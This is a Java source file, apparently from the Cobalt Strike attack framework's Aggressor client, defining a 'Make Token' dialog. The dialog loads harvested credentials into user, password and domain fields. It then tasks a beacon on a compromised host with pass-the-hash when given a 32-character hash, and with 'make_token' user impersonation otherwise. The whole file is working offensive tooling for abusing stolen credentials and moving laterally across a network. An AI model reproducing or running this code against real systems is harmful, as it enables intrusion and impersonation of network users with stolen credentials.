package aggressor.dialogs;

import aggressor.AggressorClient;
import aggressor.browsers.Credentials;
import beacon.TaskBeacon;
import dialog.DialogListener;
import dialog.DialogManager;
import dialog.DialogUtils;
import ui.ATextField;

import javax.swing.*;
import javax.swing.event.ListSelectionEvent;
import javax.swing.event.ListSelectionListener;
import java.awt.event.ActionEvent;
import java.util.HashMap;

public class MakeTokenDialog implements DialogListener,
        ListSelectionListener {
    protected JFrame dialog = null;
    protected AggressorClient client;
    protected String bid;
    protected ATextField user;
    protected ATextField pass;
    protected ATextField domain;
    protected Credentials browser;

    public MakeTokenDialog(AggressorClient client, String bid) {
        this.client = client;
        this.bid = bid;
        this.browser = new Credentials(client);
        this.browser.setColumns("user, password, realm, note");
    }

    @Override
    public void dialogAction(ActionEvent event, HashMap<String, Object> options) {
        TaskBeacon session = new TaskBeacon(this.client, this.client.getData(), this.client.getConnection(), new String[]{this.bid});
        DialogUtils.openOrActivate(this.client, this.bid);
        session.input("rev2self");
        session.Rev2Self();
        String domainz = this.domain.getText();
        if ("".equals(domainz)) {
            domainz = ".";
        }
        if (this.pass.getText().length() == 32) {
            session.input("pth " + domainz + "\\" + this.user.getText() + " " + this.pass.getText());
            session.PassTheHash(domainz, this.user.getText(), this.pass.getText());
        } else {
            session.input("make_token " + domainz + "\\" + this.user.getText() + " " + this.pass.getText());
            session.LoginUser(domainz, this.user.getText(), this.pass.getText());
        }
    }

    @Override
    public void valueChanged(ListSelectionEvent e) {
        if (e.getValueIsAdjusting()) {
            return;
        }
        this.user.setText((String) this.browser.getSelectedValueFromColumn("user"));
        this.pass.setText((String) this.browser.getSelectedValueFromColumn("password"));
        this.domain.setText((String) this.browser.getSelectedValueFromColumn("realm"));
    }

    public void show() {
        this.dialog = DialogUtils.dialog("Make Token", 580, 315);
        this.dialog.addWindowListener(this.browser.onclose());
        DialogManager controller = new DialogManager(this.dialog);
        controller.addDialogListener(this);
        JComponent credbrowser = this.browser.getContent();
        this.browser.getTable().getSelectionModel().addListSelectionListener(this);
        this.user = (ATextField) controller.text("user", "User:", 36).get(1);
        this.pass = (ATextField) controller.text("pass", "Password:", 36).get(1);
        this.domain = (ATextField) controller.text("domain", "Domain:", 36).get(1);
        JButton ok = controller.action("Build");
        JButton help = controller.help("https://www.cobaltstrike.com/help-make-token");
        this.dialog.add(credbrowser, "Center");
        this.dialog.add(DialogUtils.stackTwo(controller.layout(), DialogUtils.center(ok, help)), "South");
        this.dialog.setVisible(true);
    }
}

